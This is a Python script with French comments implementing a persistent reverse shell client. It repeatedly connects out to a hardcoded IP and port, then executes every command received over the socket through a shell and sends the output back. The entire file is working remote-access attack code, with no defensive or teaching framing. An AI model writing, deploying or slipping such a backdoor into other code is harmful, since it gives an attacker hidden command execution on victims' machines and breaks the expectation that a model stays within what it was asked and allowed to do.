#!/usr/bin/python3
import socket
import os
import pty
import select
import subprocess
import time

SERVER_IP = "192.168.1.84"  # Adresse du serveur
SERVER_PORT = 5553
current_directory = "/"  # Variable globale pour conserver le répertoire courant

def connect_to_server():
    """ Établit une connexion persistante avec le serveur """
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))
            print("[+] Connecté au serveur")

            # Créer un shell interactif
            spawn_shell(sock)
        except Exception as e:
            print(f"[!] Erreur de connexion : {e}")
            time.sleep(5)  # Attendre avant de réessayer

def spawn_shell(sock):
    """ Crée un shell interactif persistant """
    global current_directory
    

    
    while True:
        try:
            r, _, _ = select.select([sock], [], [])  # Écoute du socket

            if sock in r:
                cmd = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                if not cmd:
                    break

                # 🔥 Gestion spéciale pour `cd`
                if cmd.startswith("cd "):
                    new_dir = cmd[3:].strip()
                    try:
                        os.chdir(new_dir)
                        current_directory = os.getcwd()  # Mise à jour du répertoire
                        sock.sendall(f"Changed directory to {current_directory}\n".encode())
                    except Exception as e:
                        sock.sendall(f"cd: {e}\n".encode())
                    continue

                # 🔥 Exécuter la commande immédiatement et envoyer la sortie
                output = run_shell_command(cmd)
                sock.sendall(output)

        except Exception as e:
            print(f"[!] Erreur dans le shell : {e}")
            break

def run_shell_command(cmd):
    """ Exécute une commande shell et retourne la sortie immédiatement """
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=current_directory)
        return result.stdout.encode('utf-8', errors='ignore') + result.stderr.encode('utf-8', errors='ignore')
    except Exception as e:
        return f"Erreur: {str(e)}\n".encode('utf-8')

if __name__ == "__main__":
    connect_to_server()
